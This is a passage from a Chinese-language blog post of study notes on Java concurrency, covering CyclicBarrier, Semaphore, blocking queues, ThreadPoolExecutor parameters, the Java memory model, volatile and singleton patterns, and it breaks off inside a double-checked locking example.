class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">CyclicBarrier</span> <span class="variable">cyclicBarrier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">7</span>,()-&gt;&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;召唤神龙&quot;</span>);</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++) &#123;</span><br><span class="line">           <span class="keyword">final</span> <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">               System.out.println(Thread.currentThread().getName() + <span class="string">&quot;收集&quot;</span> + temp + <span class="string">&quot;颗龙珠&quot;</span>);</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   cyclicBarrier.await();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;).start();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="Semaphore-信号量"><a href="#Semaphore-信号量" class="headerlink" title="Semaphore 信号量"></a>Semaphore 信号量</h2><p>6个车 三个停车位 轮流等待车位</p><ul><li><p>作用：多个共享资源互斥的使用并发限流，控制最大线程数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Semaphore</span> <span class="variable">semaphore</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">3</span>); <span class="comment">//默认线程数 停车位个数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    semaphore.acquire();<span class="comment">//得到，如果已经满了就等到释放为止</span></span><br><span class="line">                    System.out.println(Thread.currentThread().getName()  + <span class="string">&quot;车进来了&quot;</span>);</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()  + <span class="string">&quot;车离开了&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                    semaphore.release();<span class="comment">//释放，会将当前的信号量释放 + 1，然后唤醒等待的线程</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>打印结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Thread-<span class="number">0</span>车进来了</span><br><span class="line">Thread-<span class="number">2</span>车进来了</span><br><span class="line">Thread-<span class="number">1</span>车进来了</span><br><span class="line">Thread-<span class="number">1</span>车离开了</span><br><span class="line">Thread-<span class="number">2</span>车离开了</span><br><span class="line">Thread-<span class="number">0</span>车离开了</span><br><span class="line">Thread-<span class="number">3</span>车进来了</span><br><span class="line">Thread-<span class="number">5</span>车进来了</span><br><span class="line">Thread-<span class="number">4</span>车进来了</span><br><span class="line">Thread-<span class="number">3</span>车离开了</span><br><span class="line">Thread-<span class="number">5</span>车离开了</span><br><span class="line">Thread-<span class="number">4</span>车离开了</span><br></pre></td></tr></table></figure><h1 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h1><p>阻塞</p></li><li><p>写入：如果队列满了，就必须阻塞等待</p></li><li><p>取出：如果队列是空的，必须阻塞等待生产</p></li><li><p>四组API</p><table><thead><tr><th></th><th><strong>抛异常</strong></th><th><strong>有返回值,不抛出异常</strong></th><th><strong>阻塞等待</strong></th><th><strong>超时等待</strong></th></tr></thead><tbody><tr><td>添加</td><td>add</td><td>offer</td><td>put</td><td>offer</td></tr><tr><td>移除</td><td>remove</td><td>poll</td><td>take</td><td>poll</td></tr><tr><td>检测队列首</td><td>element</td><td>peek</td><td>/</td><td>/</td></tr></tbody></table></li></ul><h1 id="ConcurrentHashMap1-7-1-8底层实现原理"><a href="#ConcurrentHashMap1-7-1-8底层实现原理" class="headerlink" title="ConcurrentHashMap1.7 1.8底层实现原理"></a>ConcurrentHashMap1.7 1.8底层实现原理</h1><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1658234760911-1b87b858-a2e9-4bb0-92ca-9ede8442bad0.png"></p><h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><h2 id="推荐使用-ThreadPoolExecutor-构造函数创建线程池"><a href="#推荐使用-ThreadPoolExecutor-构造函数创建线程池" class="headerlink" title="推荐使用 ThreadPoolExecutor 构造函数创建线程池"></a>推荐使用 ThreadPoolExecutor 构造函数创建线程池</h2><p>在《阿里巴巴 Java 开发手册》“并发处理”这一章节，明确指出线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。<br>使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。<br>另外，《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 构造函数的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险<br>Executors 返回线程池对象的弊端如下(后文会详细介绍到)：</p><ul><li><p><strong>FixedThreadPool 和 SingleThreadExecutor</strong> ： 允许请求的队列长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM。</p></li><li><p><strong>CachedThreadPool 和 ScheduledThreadPool</strong> ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。</p><h2 id="三大方法"><a href="#三大方法" class="headerlink" title="三大方法"></a>三大方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newSingleThreadExecutor();<span class="comment">//单线程</span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">5</span>);<span class="comment">//固定线程池大小</span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newCachedThreadPool();<span class="comment">//可伸缩的，遇强则强，遇弱则弱</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351841814-92c9e925-3340-4ee8-a6ff-37d03e6ad8be.png"><br>我们可以创建三种类型的 ThreadPoolExecutor：</p></li><li><p><strong>FixedThreadPool</strong> ： 该方法返回一个固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。</p></li><li><p><strong>SingleThreadExecutor：</strong> 方法返回一个只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。</p></li><li><p><strong>CachedThreadPool：</strong> 该方法返回一个可根据实际情况调整线程数量的线程池。线程池的线程数量不确定，但若有空闲线程可以复用，则会优先使用可复用的线程。若所有线程均在工作，又有新的任务提交，则会创建新的线程处理任务。所有线程在当前任务执行完毕后，将返回线程池进行复用。</p><h2 id="ThreadPoolExecutor类分析-（七大参数）"><a href="#ThreadPoolExecutor类分析-（七大参数）" class="headerlink" title="ThreadPoolExecutor类分析 （七大参数）"></a>ThreadPoolExecutor类分析 （七大参数）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 用给定的初始参数创建一个新的ThreadPoolExecutor。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">ThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize,//线程池的核心线程数量</span></span><br><span class="line"><span class="params">                            <span class="type">int</span> maximumPoolSize,//线程池的最大线程数</span></span><br><span class="line"><span class="params">                            <span class="type">long</span> keepAliveTime,//当线程数大于核心线程数时，多余的空闲线程存活的最长时间</span></span><br><span class="line"><span class="params">                            TimeUnit unit,//时间单位</span></span><br><span class="line"><span class="params">                            BlockingQueue&lt;Runnable&gt; workQueue,//任务队列，用来储存等待执行任务的队列</span></span><br><span class="line"><span class="params">                            ThreadFactory threadFactory,//线程工厂，用来创建线程，一般默认即可</span></span><br><span class="line"><span class="params">                            RejectedExecutionHandler handler//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务</span></span><br><span class="line"><span class="params">                             )</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">          maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">          maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">          keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">      <span class="keyword">if</span> (workQueue == <span class="literal">null</span> || threadFactory == <span class="literal">null</span> || handler == <span class="literal">null</span>)</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">      <span class="built_in">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">      <span class="built_in">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">      <span class="built_in">this</span>.workQueue = workQueue;</span><br><span class="line">      <span class="built_in">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">      <span class="built_in">this</span>.threadFactory = threadFactory;</span><br><span class="line">      <span class="built_in">this</span>.handler = handler;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>ThreadPoolExecutor 3 个最重要的参数：</strong></p><ul><li><strong>corePoolSize :</strong> 核心线程数线程数定义了最小可以同时运行的线程数量。</li><li><strong>maximumPoolSize :</strong> 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。</li><li><strong>workQueue:</strong> 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。</li></ul><p>ThreadPoolExecutor其他常见参数 :</p><ol><li><strong>keepAliveTime</strong>:当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁；</li><li><strong>unit</strong> : keepAliveTime 参数的时间单位。</li><li><strong>threadFactory</strong> :executor 创建新线程的时候会用到。</li><li><strong>handler</strong> :饱和策略。关于饱和策略下面单独介绍一下。</li></ol><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351910592-03bbd59f-6f66-4666-ae0c-e8f53000864b.png"></p><h2 id="四种拒绝策略-饱和策略"><a href="#四种拒绝策略-饱和策略" class="headerlink" title="四种拒绝策略(饱和策略)"></a>四种拒绝策略(饱和策略)</h2><ul><li>CallerRunsPolicy:由调用线程处理该任务</li><li>AbortPolicy:丢弃任务 并抛出RejectedExecutionException异常 【 默认 】</li><li>DiscardPolicy:丢弃任务，但是不抛出异常</li><li>DiscardOldestPolicy:丢弃队列最前面的任务（被poll()出去），然后重新尝试执行任务<h2 id="阻塞队列-1"><a href="#阻塞队列-1" class="headerlink" title="阻塞队列"></a>阻塞队列</h2></li></ul><ol><li>ArrayBlockingQueue、</li><li>LinkedBlockingQueue、</li><li>SynchronousQueue、</li><li>PriorityBlockQueue。<h3 id="ArrayBlockingQueue"><a href="#ArrayBlockingQueue" class="headerlink" title="ArrayBlockingQueue"></a>ArrayBlockingQueue</h3>是一个基于数组结构的有界阻塞队列，此队列按 FIFO（先进先出）原则对元素进行排序<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1661072360863-e5eb2ae1-ee98-4fb0-8a3b-4a8cf50a20dc.png"></li></ol><ul><li><p>ArrayBlockingQueue 是一个用数组实现的有界阻塞队列。</p></li><li><p>队列慢时插入操作被阻塞，队列空时，移除操作被阻塞。</p></li><li><p>按照先进先出（FIFO）原则对元素进行排序。</p></li><li><p>默认不保证线程公平的访问队列。</p></li><li><p>公平访问队列：按照阻塞的先后顺序访问队列，即先阻塞的线程先访问队列。</p></li><li><p>非公平性是对先等待的线程是非公平的，当队列可用时，阻塞的线程都可以争夺访问队列的资格。有可能先阻塞的线程最后才访问访问队列。</p></li><li><p>公平性会降低吞吐量。</p><h3 id="LinkedBlockingQueue"><a href="#LinkedBlockingQueue" class="headerlink" title="LinkedBlockingQueue"></a>LinkedBlockingQueue</h3><p>一个基于链表结构的阻塞队列，此队列按 FIFO 排序元素，吞吐量通常要高于 ArrayBlockingQueue。静态工厂方法 Executors.newFixedThreadPool () 使用了这个队列。（newFixedThreadPool 用于创建固定线程数）<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1661072380170-332534f5-2b5e-4806-9229-25ae9d3ac206.png"></p></li><li><p>LinkedBlockingQueue 具有单链表和有界阻塞队列的功能。</p></li><li><p>队列慢时插入操作被阻塞，队列空时，移除操作被阻塞。</p></li><li><p>默认和最大长度为 Integer.MAX_VALUE，相当于无界 (值非常大：2^31-1)。</p><h3 id="SynchronousQueue"><a href="#SynchronousQueue" class="headerlink" title="SynchronousQueue"></a>SynchronousQueue</h3><p>一个不存储元素的阻塞队列。每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于 LinkedBlockingQueue，静态工厂方法 Executors.newCachedThreadPool 使用这个队列。（newCachedThreadPool 用于根据需要创建新线程）<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1661072403061-dcb1a266-2c8b-4a92-8cd8-daa89a0501b2.png"></p></li><li><p>我称 SynchronousQueue 为” 传球好手 “。想象一下这个场景：小明抱着一个篮球想传给小花，如果小花没有将球拿走，则小明是不能再拿其他球的。</p></li><li><p>SynchronousQueue 负责把生产者产生的数据传递给消费者线程。</p></li><li><p>SynchronousQueue 本身不存储数据，调用了 put 方法后，队列里面也是空的。</p></li><li><p>每一个 put 操作必须等待一个 take 操作完成，否则不能添加元素。</p></li><li><p>适合传递性场景。</p></li><li><p>性能高于 ArrayBlockingQueue 和 LinkedBlockingQueue。</p><h3 id="PriorityBlockingQueue"><a href="#PriorityBlockingQueue" class="headerlink" title="PriorityBlockingQueue"></a>PriorityBlockingQueue</h3><p>一个具有优先级的无限阻塞队列。<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1661072427674-d094d61c-62f2-4170-a509-d43dd9d67799.png"></p></li><li><p>PriorityBlockQueue = PriorityQueue + BlockingQueue</p></li><li><p>之前我们也讲到了 PriorityQueue 的原理，支持对元素排序。</p></li><li><p>元素默认自然排序。</p></li><li><p>可以自定义 CompareTo () 方法来指定元素排序规则。</p></li><li><p>可以通过构造函数构造参数 Comparator 来对元素进行排序。</p></li></ul><h2 id="最大线程到底如何确定（调优）"><a href="#最大线程到底如何确定（调优）" class="headerlink" title="最大线程到底如何确定（调优）"></a>最大线程到底如何确定（调优）</h2><ul><li><p>CPU密集型，几核就是几，可以保持CPU的效率最高</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().availableProcessors();<span class="comment">//获取电脑的CPU核数，运维电脑和本地不一样</span></span><br></pre></td></tr></table></figure><ul><li>这种任务消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。</li></ul></li><li><p>IO密集型，判断程序中十分消耗IO的线程，大于这个数就行，一般设置为2倍</p><ul><li>这种任务应用起来，系统会用大部分的时间来处理 I/O 交互，而线程在处理 I/O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I/O 密集型任务的应用中，我们可以多配置一些线程，具体的计算方法是 2N。<h1 id="JMM模型（Java内存模型）"><a href="#JMM模型（Java内存模型）" class="headerlink" title="JMM模型（Java内存模型）"></a>JMM模型（Java内存模型）</h1>为了屏蔽系统之间的差异<br>Java 内存模型抽象了线程和主内存之间的关系，就比如说线程之间的共享变量必须存储在主内存中。Java 内存模型主要目的是为了屏蔽系统和硬件的差异，避免一套代码在不同的平台下产生的效果不一致。<br>在 JDK1.2 之前，Java 的内存模型实现总是从<strong>主存</strong>（即共享内存）读取变量，是不需要进行特别的注意的。而在当前的 Java 内存模型下，线程可以把变量保存<strong>本地内存</strong>（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成<strong>数据的不一致</strong>。<br><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657351998026-7bd11dc5-7f4b-4d9b-a474-bf11bf9e2779.png"></li></ul></li><li><p>lock(锁定):作用于主内存的变量，它把一个变量标识为一条线程独占的状态。</p></li><li><p>unlock(解锁):作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量 才可以被其他线程锁定。</p></li><li><p>read(读取):作用于主内存的变量，它把一个变量的值从主内存传输到线程的工作内存中，以 便随后的load动作使用。</p></li><li><p>load(载入):作用于工作内存的变量，它把read操作从主内存中得到的变量值放入工作内存的 变量副本中。</p></li><li><p>use(使用):作用于工作内存的变量，它把工作内存中一个变量的值传递给执行引擎，每当虚 拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。</p></li><li><p>assign(赋值):作用于工作内存的变量，它把一个从执行引擎接收的值赋给工作内存的变量， 每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作</p></li><li><p>store(存储):作用于工作内存的变量，它把工作内存中一个变量的值传送到主内存中，以便随 后的write操作使用。</p></li><li><p>write(写入):作用于主内存的变量，它把store操作从工作内存中得到的变量的值放入主内存的 变量中。</p></li><li><p>不允许read和load、store和write操作之一单独出现，即不允许一个变量从主内存读取了但工作内 存不接受，或者工作内存发起回写了但主内存不接受的情况出现。</p></li><li><p>不允许一个线程丢弃它最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回 主内存。</p></li><li><p>不允许一个线程无原因地(没有发生过任何assign操作)把数据从线程的工作内存同步回主内存 中。</p></li><li><p>一个新的变量只能在主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化(load或 a s s i gn ) 的 变 量 ， 换 句 话 说 就 是 对 一 个 变 量 实 施 u s e 、 s t o r e 操 作 之 前 ， 必 须 先 执 行 a s s i gn 和 l o a d 操 作 。</p></li><li><p>一个变量在同一个时刻只允许一条线程对其进行lock操作，但lock操作可以被同一条线程重复执 行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁。</p></li><li><p>如果对一个变量执行lock操作，那将会清空工作内存中此变量的值，在执行引擎使用这个变量 前，需要重新执行load或assign操作以初始化变量的值。</p></li><li><p>如果一个变量事先没有被lock操作锁定，那就不允许对它执行unlock操作，也不允许去unlock一个 被其他线程锁定的变量。</p></li><li><p>对一个变量执行unlock操作之前，必须先把此变量同步回主内存中(执行store、write操作)。</p></li></ul><h1 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h1><p><strong>volatile 关键字防止 JVM 的指令重排 ，保证变量的可见性，内存屏障保证有序性，但volatile不保证原子性</strong><br>什么是指令重排：<strong>你写的程序，计算机并不是按照你写的那样去执行的</strong><br>源代码–&gt; 编译器的优化重排–&gt; 指令运行也可能会重排–&gt; 内存系统也会重排–&gt;执行<br><strong>处理器在进行指令重排的时候，考虑：数据之间依赖性问题</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">x = x + <span class="number">5</span>;</span><br><span class="line">y = x * x;</span><br><span class="line"><span class="comment">//我们希望：1234</span></span><br><span class="line"><span class="comment">//但可能是：2134 1324</span></span><br><span class="line"><span class="comment">//可不可能：4123？ 不可能</span></span><br></pre></td></tr></table></figure><p>可能造成的结果： a b x y 都是0</p><table><thead><tr><th><strong>线程A</strong></th><th><strong>线程B</strong></th></tr></thead><tbody><tr><td>x = a</td><td>y = b</td></tr><tr><td>b = 1</td><td>a = 2</td></tr></tbody></table><p>正常的结果：x = 0； y = 0;</p><table><thead><tr><th><strong>线程A</strong></th><th><strong>线程B</strong></th></tr></thead><tbody><tr><td>b = 1</td><td>a = 2</td></tr><tr><td>x = a</td><td>y = b</td></tr></tbody></table><p>诡异的结果：x = 2; y = 1;<br><strong>volatile可以避免指令重排：</strong><br>cpu中内存屏障作用：</p><ol><li>保证特定的操作执行顺序</li><li>可以保证某些变量的内存可见性（利用这些特性 volatile实现了可见性）</li></ol><p><img src="/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/1657352084385-737069b5-895b-4a8e-ad1d-180bb500a1e7.png"></p><h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><p>单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。<br>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。<br><strong>注意：</strong></p><ul><li>1、单例类只能有一个实例。</li><li>2、单例类必须自己创建自己的唯一实例。</li><li>3、单例类必须给所有其他对象提供这一实例。<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hungry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Hungry</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">Hungry</span> <span class="variable">hungry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hungry</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hungry <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hungry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="懒汉式（线程不安全）"><a href="#懒汉式（线程不安全）" class="headerlink" title="懒汉式（线程不安全）"></a>懒汉式（线程不安全）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lazy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Lazy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Lazy lazy;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Lazy <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lazy == <span class="literal">null</span>) &#123;</span><br><span class="line">            lazy = <span class="keyword">new</span> <span class="title class_">Lazy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="懒汉式：双检锁-双重校验锁（DCL，即double-checked-locking）"><a href="#懒汉式：双检锁-双重校验锁（DCL，即double-checked-locking）" class="headerlink" title="懒汉式：双检锁/双重校验锁（DCL，即double-checked locking）"></a>懒汉式：双检锁/双重校验锁（DCL，即double-checked locking）</h2>这里双重检测加锁是保证了操作原子性，只有一个线程能创建一个实例，其他线程无法创建第二个。volatile关键字是为了防止因为指令重排导致的多线程问题，有可能线程A创建一个实例，虚拟机只执行了分配空间，对象地址引用这两步，这是线程B过来发现对象已经被创建了，但是获取到的对象是还没有被初始化的。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lazy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Lazy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Lazy lazy;</span><br><span class="line">    <span class="comment">//双重检测锁模式 懒汉式单例 DCL懒汉式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Lazy <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lazy == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Lazy.class)&#123; </span><br><span class="line">            <span class="keyword">if</span>(lazy == <span class="literal">null</span>) &#123;</span><br><span class="line">                lazy = <span class="keyword">new</span> <span class="title class_">Lazy</span>();<span class="comment">//不是一个原子性操作</span></span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 1.分配内存空间</span></span><br><span class="line"><span class="comment">                 * 2.执行构造方法（初始化对象）</span></span><br><span class="line"><span class="comment">                 * 3.对象指向空间</span></span><br><span class="line"><span class="comment">                 *</span></span><br><span class="line"><span class="comment">                 * 指令重排 132</span></span><br><span class="line"><span class="comment">                 * A线程没问题，B指向空间发现不为null，直接return 